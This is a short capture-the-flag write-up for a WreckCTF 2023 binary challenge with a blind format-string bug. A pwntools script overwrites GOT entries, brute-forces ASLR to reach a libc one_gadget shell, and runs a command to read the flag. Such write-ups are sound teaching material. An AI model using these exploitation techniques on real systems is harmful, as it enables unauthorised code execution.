
# analysis

[chall](/wreckctf-2023/chall)

![](/wreckctf-2023/agile_main.png)

- blind format string on stack
- no PIE
- ASLR is present

The simplest solution is just pick a fitting location and call a one_gadget :) the setvbuf call works and by rewriting `__stack_chk_fail` to `_start` we can do a partial (three byte) overwrite to set it to another location in libc with only 12 ASLR-randomized bits. about 20 minutes later there was a flag in stdout lol

# solve

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("chall_patched")

context.binary = exe
context.cyclic_size = 8

def conn():
    if args.REMOTE:
        r = remote("wreckctf.com", 34426)
    else:
        if args.GDB:
            r = gdb.debug([exe.path],gdbscript="b *main+142\nc")
        else:
            r = process([exe.path])

    return r


def main():
    r = conn()

    # good luck pwning :)

    # got['__stack_chk_fail'] rewrite lsb from 0x40 to 0x1a for a ret gadget



    payload_ret_main = flat({
        0x0:b"%240c%36$hhn" + b"%16c", # rewrite stack chk fail to _start
        40: b"C" *8,
        0x100-8: p64(exe.got['__stack_chk_fail'])[0:7],
    },length=255)


    
    # e7 = 231
    # ec = 236
    # f8 = 248
    payload_fix_setvbuf = flat({
        0x0:[
            b"%231c%36$hhn",
            b"%5c%35$hhn",
            b"%12c%34$hhn",
            b"%24c"
        ],
        
        0x100-24: p64(exe.got['setbuf']),
        0x100-16: p64(exe.got['setbuf']+1),
        0x100-8: p64(exe.got['setbuf']+2)[0:7],
    },length=255)

    r.send(payload_ret_main)
    r.send(payload_fix_setvbuf)
    time.sleep(0.1)
    r.sendline(b"grep flag *;exit;")
    print(r.recvall())
    r.close()


if __name__ == "__main__":
    main()
    if args.REMOTE:
        count = 0
        while True:
            main()
            count += 1
```